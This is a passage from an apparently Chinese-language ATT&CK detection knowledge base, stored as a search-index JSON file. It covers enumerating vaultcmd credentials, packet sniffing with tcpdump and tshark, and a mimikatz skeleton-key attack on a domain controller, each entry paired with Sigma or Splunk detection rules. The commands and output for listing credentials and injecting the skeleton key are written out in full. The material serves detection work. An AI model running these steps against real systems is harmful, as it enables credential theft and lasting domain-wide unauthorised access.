\uff09\u4fe1\u606f\u7684\u8fc7\u7a0b\u3002\u7136\u540e\u53ef\u4ee5\u4f7f\u7528\u51ed\u636e\u6765\u6267\u884c\u6a2a\u5411\u79fb\u52a8\u5e76\u8bbf\u95ee\u53d7\u9650\u5236\u7684\u4fe1\u606f\u3002 \u653b\u51fb\u8005\u548c\u4e13\u4e1a\u5b89\u5168\u6d4b\u8bd5\u4eba\u5458\u90fd\u53ef\u80fd\u4f1a\u4f7f\u7528\u6b64\u6280\u672f\u4e2d\u63d0\u5230\u7684\u51e0\u79cd\u5de5\u5177\u3002\u4e5f\u53ef\u80fd\u5b58\u5728\u5176\u4ed6\u81ea\u5b9a\u4e49\u5de5\u5177\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#_1","text":"\u83b7\u5f97\u7cfb\u7edf\u51ed\u636e\u7684\u57fa\u672c\u4fe1\u606f \u5de5\u51771\uff1a vaultcmd(windows\u7cfb\u7edf\u81ea\u5e26) \u5e38\u7528\u547d\u4ee4\uff1a \u5217\u51fa\u4fdd\u7ba1\u5e93(vault)\u5217\u8868\uff1a vaultcmd /list \u6ce8\uff1a\u4e0d\u540c\u7c7b\u578b\u7684\u51ed\u636e\u4fdd\u5b58\u5728\u4e0d\u540c\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b \u5217\u51fa\u4fdd\u7ba1\u5e93(vault)\u6982\u8981\uff0c\u51ed\u636e\u540d\u79f0\u548cGUID\uff1a vaultcmd /listschema \u6ce8\uff1aGUID\u5bf9\u5e94\u8def\u5f84%localappdata%/Microsoft\\Vault{GUID}\u4e0b\u7684\u6587\u4ef6 \u5217\u51fa\u540d\u4e3a\u201dWeb Credentials\u201d\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b\u7684\u6240\u6709\u51ed\u636e\u4fe1\u606f\uff1a vaultcmd /listcreds:\"Web Credentials\" \u6ce8\uff1a\u5982\u679c\u662f\u4e2d\u6587\u64cd\u4f5c\u7cfb\u7edf\uff0c\u53ef\u5c06\u540d\u79f0\u66ff\u6362\u4e3a\u5bf9\u5e94\u7684GUID\uff0c\u547d\u4ee4\u5982\u4e0b \u5217\u51faGUID\u4e3a{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b\u7684\u6240\u6709\u51ed\u636e\uff1a vaultcmd /listcreds:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28} \u5217\u51faGUID\u4e3a{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}\u7684\u4fdd\u7ba1\u5e93(vault)\u7684\u5c5e\u6027\uff0c\u5305\u62ec\u6587\u4ef6\u4f4d\u7f6e\u3001\u5305\u542b\u7684\u51ed\u636e\u6570\u91cf\u3001\u4fdd\u62a4\u65b9\u6cd5\uff1a vaultcmd /listproperties:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7 windows Sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#_3","text":"\u81ea\u884c\u6d4b\u8bd5\u5373\u53ef\uff0c\u7565\u7b80\u5355","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#_4","text":"windows\u5b89\u5168\u65e5\u5fd7\u4e0b\u8f7d\u5730\u5740\uff1a","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#sigma","text":"title: win-vaultcmd\u83b7\u53d6\u7cfb\u7edf\u51ed\u636e\u57fa\u672c\u4fe1\u606f description: windows server 2016 tags: T1003 status: experimental author: 12306Bro logsource: product: windows service: security/Sysmon detection: selection: EventID: - 4688 #windows\u5b89\u5168\u65e5\u5fd7\uff0c\u5df2\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b\u3002 - 1 #windows Sysmon\u65e5\u5fd7\uff0c\u521b\u5efa\u65b0\u7684\u8fdb\u7a0b New processname: C:\\Windows\\System32\\VaultCmd.exe #\u65b0\u8fdb\u7a0b\u540d\u79f0/image Parent processname: C:\\Windows\\System32\\cmd.exe #\u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0/ParentImage Process commandline: - vaultcmd /list #\u5217\u51fa\u4fdd\u7ba1\u5e93(vault)\u5217\u8868 - vaultcmd /listschema #\u5217\u51fa\u4fdd\u7ba1\u5e93(vault)\u6982\u8981\uff0c\u51ed\u636e\u540d\u79f0\u548cGUID - vaultcmd /listcreds:{*} #\u4e2d\u6587\u7cfb\u7edf\uff0c\u5217\u51faGUID\u4e3a{* }\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b\u7684\u6240\u6709\u51ed\u636e - vaultcmd /listcreds:\"*\" #\u82f1\u6587\u7cfb\u7edf \uff0c\u5217\u51fa\u540d\u4e3a\u201d*\u201d\u7684\u4fdd\u7ba1\u5e93(vault)\u4e0b\u7684\u6240\u6709\u51ed\u636e\u4fe1\u606f - vaultcmd /listproperties:{*} #\u4e2d\u6587\u7cfb\u7edf\uff0c\u5217\u51faGUID\u4e3a{*}\u7684\u4fdd\u7ba1\u5e93(vault)\u7684\u5c5e\u6027\uff0c\u5305\u62ec\u6587\u4ef6\u4f4d\u7f6e\u3001\u5305\u542b\u7684\u51ed\u636e\u6570\u91cf\u3001\u4fdd\u62a4\u65b9\u6cd5 condition: selection","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#_6","text":"\u6ce8\uff1a\u5728\u4f4e\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4f7f\u7528windows \u5b89\u5168\u65e5\u5fd74688\uff0c\u8fdb\u7a0bVaultCmd.exe\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\uff1b\u4e5f\u53ef\u4f7f\u7528Sysmon\u8fdb\u884c\u884c\u4e3a\u8bb0\u5f55\uff0c\u5206\u6790\u68c0\u6d4b\u3002","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-win-vaultcmd%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%87%AD%E8%AF%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/#_7","text":"MITRE-ATT&CK-T1003 https://attack.mitre.org/techniques/T1003/ \u6e17\u900f\u6280\u5de7\u2014\u2014Windows\u4e2dCredential Manager\u7684\u4fe1\u606f\u83b7\u53d6 https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%ADCredential-Manager%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/","text":"T1040-linux-\u7f51\u7edc\u55c5\u63a2 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u7f51\u7edc\u55c5\u63a2\u662f\u6307\u4f7f\u7528\u7cfb\u7edf\u4e0a\u7684\u7f51\u7edc\u63a5\u53e3\u6765\u76d1\u89c6\u6216\u6355\u83b7\u901a\u8fc7\u6709\u7ebf\u6216\u65e0\u7ebf\u8fde\u63a5\u53d1\u9001\u7684\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u7f51\u7edc\u63a5\u53e3\u7f6e\u4e8e\u6df7\u6742\u6a21\u5f0f\u4ee5\u901a\u8fc7\u7f51\u7edc\u88ab\u52a8\u5730\u8bbf\u95ee\u4f20\u8f93\u4e2d\u7684\u6570\u636e\uff0c\u6216\u8005\u4f7f\u7528\u8de8\u63a5\u7aef\u53e3\u6765\u6355\u83b7\u66f4\u5927\u91cf\u7684\u6570\u636e\u3002 \u901a\u8fc7\u8be5\u6280\u672f\u53ef\u4ee5\u6355\u83b7\u7684\u6570\u636e\u5305\u62ec\u7528\u6237\u51ed\u8bc1\uff0c\u5c24\u5176\u662f\u901a\u8fc7\u4e0d\u5b89\u5168\u7684\u672a\u52a0\u5bc6\u534f\u8bae\u53d1\u9001\u7684\u51ed\u8bc1\uff1b\u7f51\u7edc\u55c5\u63a2\u8fd8\u53ef\u4ee5\u83b7\u53d6\u5230\u914d\u7f6e\u7ec6\u8282\uff0c\u4f8b\u5982\u8fd0\u884c\u670d\u52a1\uff0c\u7248\u672c\u53f7\u4ee5\u53ca\u540e\u7eed\u6a2a\u5411\u79fb\u52a8\u548c/\u6216\u9632\u5fa1\u9003\u907f\u6d3b\u52a8\u6240\u9700\u7684\u5176\u4ed6\u7f51\u7edc\u7279\u5f81\uff08\u4f8b\u5982\uff1aIP\u5bfb\u5740\uff0c\u4e3b\u673a\u540d\uff0cVLAN ID\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b tcpdump -c 5 -nnni #{\u7f51\u5361\u63a5\u53e3} tshark -c 5 -i #{\u7f51\u5361\u63a5\u53e3} \u68c0\u6d4b\u65e5\u5fd7 linux /var/log/message \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u4e0b\u9ed8\u8ba4\u4e0d\u5f00\u542fmessage\u65e5\u5fd7\uff0c\u9700\u8981\u624b\u52a8\u5f00\u542f\uff09 \u6d4b\u8bd5\u590d\u73b0 \u573a\u666f\u4e00 root@icbc:~# tcpdump -c 5 -nnni ens33 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes 10:37:34.347544 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:37.355725 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:40.356238 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:43.356969 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:49.808569 IP 192.168.66.148.59150 > 192.168.66.2.53: 15476+ [1au] A? connectivity-check.ubuntu.com. (58) 5 packets captured 5 packets received by filter 0 packets dropped by kernel \u573a\u666f\u4e8c root@icbc:~# tshark -c 5 -i ens33 Running as user \"root\" and group \"root\". This could be dangerous. Capturing on 'ens33' 1 0.000000000 192.168.66.148 \u2192 192.168.66.2 DNS 100 Standard query 0xe349 A connectivity-check.ubuntu.com OPT 2 0.038532840 Vmware_e8:11:b3 \u2192 Broadcast ARP 60 Who has 192.168.66.148? Tell 192.168.66.2 3 0.038552195 Vmware_02:d5:c7 \u2192 Vmware_e8:11:b3 ARP 42 192.168.66.148 is at 00:0c:29:02:d5:c7 4 0.038758293 192.168.66.2 \u2192 192.168.66.148 DNS 132 Standard query response 0xe349 A connectivity-check.ubuntu.com A 35.224.99.156 A 35.222.85.5 OPT 5 0.039670671 192.168.66.148 \u2192 35.222.85.5 TCP 74 57812 \u2192 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=136575048 TSecr=0 WS=128 5 packets captured \u6d4b\u8bd5\u7559\u75d5 0x1 message\u65e5\u5fd7 Jul 19 10:37:33 icbc kernel: [ 298.396406] device ens33 entered promiscuous mode 0x2 message\u65e5\u5fd7 Jul 19 10:47:42 icbc systemd[1]: Started Cleanup of Temporary Directories. Jul 19 10:47:50 icbc kernel: [ 915.199848] device ens33 left promiscuous mode Jul 19 10:47:50 icbc start.sh[734]: 2019-07-19 10:47:50,165: DEBUG helpers.application.health RAM: 65MB \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u68c0\u6d4b\u89c4\u5219 index=linux sourcetype=syslog entered promiscuous mode | table host,message index=linux sourcetype=syslog left promiscuous mode | table host,message \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1040: https://attack.mitre.org/techniques/T1040/","title":"T1040-linux-\u7f51\u7edc\u55c5\u63a2"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#t1040-linux-","text":"","title":"T1040-linux-\u7f51\u7edc\u55c5\u63a2"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#attck","text":"\u7f51\u7edc\u55c5\u63a2\u662f\u6307\u4f7f\u7528\u7cfb\u7edf\u4e0a\u7684\u7f51\u7edc\u63a5\u53e3\u6765\u76d1\u89c6\u6216\u6355\u83b7\u901a\u8fc7\u6709\u7ebf\u6216\u65e0\u7ebf\u8fde\u63a5\u53d1\u9001\u7684\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5c06\u7f51\u7edc\u63a5\u53e3\u7f6e\u4e8e\u6df7\u6742\u6a21\u5f0f\u4ee5\u901a\u8fc7\u7f51\u7edc\u88ab\u52a8\u5730\u8bbf\u95ee\u4f20\u8f93\u4e2d\u7684\u6570\u636e\uff0c\u6216\u8005\u4f7f\u7528\u8de8\u63a5\u7aef\u53e3\u6765\u6355\u83b7\u66f4\u5927\u91cf\u7684\u6570\u636e\u3002 \u901a\u8fc7\u8be5\u6280\u672f\u53ef\u4ee5\u6355\u83b7\u7684\u6570\u636e\u5305\u62ec\u7528\u6237\u51ed\u8bc1\uff0c\u5c24\u5176\u662f\u901a\u8fc7\u4e0d\u5b89\u5168\u7684\u672a\u52a0\u5bc6\u534f\u8bae\u53d1\u9001\u7684\u51ed\u8bc1\uff1b\u7f51\u7edc\u55c5\u63a2\u8fd8\u53ef\u4ee5\u83b7\u53d6\u5230\u914d\u7f6e\u7ec6\u8282\uff0c\u4f8b\u5982\u8fd0\u884c\u670d\u52a1\uff0c\u7248\u672c\u53f7\u4ee5\u53ca\u540e\u7eed\u6a2a\u5411\u79fb\u52a8\u548c/\u6216\u9632\u5fa1\u9003\u907f\u6d3b\u52a8\u6240\u9700\u7684\u5176\u4ed6\u7f51\u7edc\u7279\u5f81\uff08\u4f8b\u5982\uff1aIP\u5bfb\u5740\uff0c\u4e3b\u673a\u540d\uff0cVLAN ID\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_1","text":"tcpdump -c 5 -nnni #{\u7f51\u5361\u63a5\u53e3} tshark -c 5 -i #{\u7f51\u5361\u63a5\u53e3}","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_2","text":"linux /var/log/message \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u4e0b\u9ed8\u8ba4\u4e0d\u5f00\u542fmessage\u65e5\u5fd7\uff0c\u9700\u8981\u624b\u52a8\u5f00\u542f\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_4","text":"root@icbc:~# tcpdump -c 5 -nnni ens33 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes 10:37:34.347544 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:37.355725 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:40.356238 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:43.356969 IP 192.168.66.1.60886 > 239.255.255.250.1900: UDP, length 137 10:37:49.808569 IP 192.168.66.148.59150 > 192.168.66.2.53: 15476+ [1au] A? connectivity-check.ubuntu.com. (58) 5 packets captured 5 packets received by filter 0 packets dropped by kernel","title":"\u573a\u666f\u4e00"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_5","text":"root@icbc:~# tshark -c 5 -i ens33 Running as user \"root\" and group \"root\". This could be dangerous. Capturing on 'ens33' 1 0.000000000 192.168.66.148 \u2192 192.168.66.2 DNS 100 Standard query 0xe349 A connectivity-check.ubuntu.com OPT 2 0.038532840 Vmware_e8:11:b3 \u2192 Broadcast ARP 60 Who has 192.168.66.148? Tell 192.168.66.2 3 0.038552195 Vmware_02:d5:c7 \u2192 Vmware_e8:11:b3 ARP 42 192.168.66.148 is at 00:0c:29:02:d5:c7 4 0.038758293 192.168.66.2 \u2192 192.168.66.148 DNS 132 Standard query response 0xe349 A connectivity-check.ubuntu.com A 35.224.99.156 A 35.222.85.5 OPT 5 0.039670671 192.168.66.148 \u2192 35.222.85.5 TCP 74 57812 \u2192 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=136575048 TSecr=0 WS=128 5 packets captured","title":"\u573a\u666f\u4e8c"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_6","text":"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#0x1","text":"message\u65e5\u5fd7 Jul 19 10:37:33 icbc kernel: [ 298.396406] device ens33 entered promiscuous mode","title":"0x1"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#0x2","text":"message\u65e5\u5fd7 Jul 19 10:47:42 icbc systemd[1]: Started Cleanup of Temporary Directories. Jul 19 10:47:50 icbc kernel: [ 915.199848] device ens33 left promiscuous mode Jul 19 10:47:50 icbc start.sh[734]: 2019-07-19 10:47:50,165: DEBUG helpers.application.health RAM: 65MB","title":"0x2"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_7","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#splunk","text":"index=linux sourcetype=syslog entered promiscuous mode | table host,message index=linux sourcetype=syslog left promiscuous mode | table host,message","title":"splunk\u68c0\u6d4b\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_8","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1040-linux-%E7%BD%91%E7%BB%9C%E5%97%85%E6%8E%A2/#_9","text":"MITRE-ATT&CK-T1040: https://attack.mitre.org/techniques/T1040/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/","text":"T1098-win-\u4e07\u80fd\u5bc6\u7801 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u53d7\u5bb3\u8005\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u6216\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u6743\u9650\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4f7f\u7528\u4e07\u80fd\u5bc6\u7801\uff08skeleton key\uff09\uff0c\u53ef\u4ee5\u5bf9\u57df\u5185\u6743\u9650\u8fdb\u884c\u6301\u4e45\u5316\u64cd\u4f5c\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6b65\u9aa41\uff08PC\u4e0a\u6267\u884c\uff0c\u666e\u901a\u57df\u7528\u6237\u6743\u9650\uff09 C:\\Users\\xiaomi>dir \\\\dc.xiaomi.org\\c$ \u62d2\u7edd\u8bbf\u95ee\u3002 C:\\Users\\xiaomi>net use \\\\dc.xiaomi.org\\ipc$ \"admin.098\" /user:xiaomi\\administra tor \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 C:\\Users\\xiaomi>dir \\\\dc.xiaomi.org\\c$ \u9a71\u52a8\u5668 \\\\dc.xiaomi.org\\c$ \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002 \u5377\u7684\u5e8f\u5217\u53f7\u662f 50E9-7D0C \\\\dc.xiaomi.org\\c$ \u7684\u76ee\u5f55 2009/07/14 11:20 <DIR> PerfLogs 2020/03/23 15:24 <DIR> Program Files 2020/03/23 15:24 <DIR> Program Files (x86) 2020/03/23 14:47 <DIR> Users 2020/03/23 15:30 <DIR> Windows 0 \u4e2a\u6587\u4ef6 0 \u5b57\u8282 5 \u4e2a\u76ee\u5f55 32,728,838,144 \u53ef\u7528\u5b57\u8282 C:\\Users\\xiaomi>net use \u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002 \u72b6\u6001 \u672c\u5730 \u8fdc\u7a0b \u7f51\u7edc ------------------------------------------------------------------------------- OK \\\\dc.xiaomi.org\\ipc$ Microsoft Windows Network \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 C:\\Users\\xiaomi>net use \\\\dc.xiaomi.org\\ipc$ /del /y \\\\dc.xiaomi.org\\ipc$ \u5df2\u7ecf\u5220\u9664\u3002 C:\\Users\\xiaomi>net use \u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002 \u5217\u8868\u662f\u7a7a\u7684\u3002 \u6b65\u9aa42\uff08DC\u4e0a\u6267\u884c\uff0c\u7ba1\u7406\u5458\u6743\u9650\uff09 C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64>mimikatz.exe \"privilege::debug \" \"misc::skeleton\" exit .#####. mimikatz 2.1.1 (x64) built on Apr 9 2017 23:24:20 .## ^ ##. \"A La Vie, A L'Amour\" ## / \\ ## /* * * ## \\ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo) '#####' with 21 modules * * */ mimikatz(commandline) # privilege::debug Privilege '20' OK mimikatz(commandline) # misc::skeleton [KDC] data [KDC] struct [KDC] keys patch OK [RC4] functions [RC4] init patch OK [RC4] decrypt patch OK mimikatz(commandline) # exit Bye! \u7cfb\u7edf\u63d0\u793aSkeleton Key\u5df2\u7ecf\u6ce8\u5165\u6210\u529f\u3002\u6b64\u65f6\uff0c\u4f1a\u5728\u57df\u5185\u7684\u6240\u6709\u8d26\u6237\u4e2d\u6dfb\u52a0\u4e00\u4e2aSkeleton key\uff0c\u5176\u5bc6\u7801\u9ed8\u8ba4\u4e3a\u201cmimikatz\u201d\u3002\u63a5\u4e0b\u6765\u53ef\u4ee5\u4ee5\u57df\u5185\u4efb\u4f55\u7528\u6237\u7684\u8eab\u4efd\uff0c\u914d\u5408\u8be5Skeleton Key\uff0c\u8fdb\u884c\u57df\u5185\u8eab\u4efd\u6388\u6743\u9a8c\u8bc1\u4e86\u3002 \u6b65\u9aa43\uff08PC\u4e0a\u6267\u884c\uff0c\u666e\u901a\u57df\u7528\u6237\u6743\u9650\uff09 C:\\Users\\xiaomi>net use \\\\dc.xiaomi.org\\ipc$ \"mimikatz\" /user:xiaomi\\administrat or \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 C:\\Users\\xiaomi>dir \\\\dc.xiaomi.org\\c$ \u9a71\u52a8\u5668 \\\\dc.xiaomi.org\\c$ \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002 \u5377\u7684\u5e8f\u5217\u53f7\u662f 50E9-7D0C \\\\dc.xiaomi.org\\c$ \u7684\u76ee\u5f55 2009/07/14 11:20 <DIR> PerfLogs 2020/03/23 15:24 <DIR> Program Files 2020/03/23 15:24 <DIR> Program Files (x86) 2020/03/23 14:47 <DIR> Users 2020/03/23 15:30 <DIR> Windows 0 \u4e2a\u6587\u4ef6 0 \u5b57\u8282 5 \u4e2a\u76ee\u5f55 32,758,198,272 \u53ef\u7528\u5b57\u8282 \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c\u591a\u4e8b\u4ef6\u5173\u8054\u5206\u6790 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: Windows \u4e07\u80fd\u5bc6\u7801 description: Windows server 2008 R2\\win 7 references: https://0xsp.com/ad-attack-or-defense/ad-ttps-list tags: T1098 status: \u6d4b\u8bd5\u9636\u6bb5 author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4673 #\u8c03\u7528\u6743\u9650\u7684\u670d\u52a1 selection2: EventID: 4611 #\u53d7\u4fe1\u4efb\u7684\u767b\u5f55\u8fdb\u7a0b\u5df2\u5728\u672c\u5730\u5b89\u5168\u673a\u6784\u6ce8\u518c selection3: EventID: 4688 #\u65b0\u8fdb\u7a0b\u521b\u5efa selection4: EventID: 4689 #\u9000\u51fa\u8fdb\u7a0b condition: all of them timeframe: last 5s level: medium \u5efa\u8bae \u4ee5\u4e0a\u89c4\u5219\u5b58\u5728\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4e0d\u7a33\u5b9a\u6027\uff0c\u8c28\u614e\u4f7f\u7528\uff01 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1098 